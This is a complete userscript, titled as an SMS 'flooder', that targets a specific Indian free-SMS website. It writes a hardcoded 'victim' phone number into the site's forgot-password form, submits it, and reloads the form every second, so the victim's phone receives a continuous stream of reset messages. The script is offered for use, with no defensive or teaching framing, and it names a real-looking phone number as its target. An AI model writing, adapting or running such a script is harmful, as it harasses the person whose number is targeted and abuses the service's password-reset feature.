// ==UserScript==
// @name          Anonymous PAISAFREESMS.COM flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*paisafreesms.com/*
// @credits       One
// ==/UserScript==

var victim=9633087782 //
var delay=1000; // Enter delay in milliseconds if required

if(document.location=="http://www.paisafreesms.com/forgetpass.aspx"||document.location=="http://www.paisafreesms.com/forgetpass.aspx")
{
document.getElementById('txtusername').value=victim;
document.getElementById('bttnsave').click();
}
if(document.location=="http://www.paisafreesms.com/Forgetpasssucess.aspx"||document.location=="http://www.paisafreesms.com/Forgetpasssucess.aspx")
setTimeout("document.location='http://www.paisafreesms.com/forgetpass.aspx'",delay);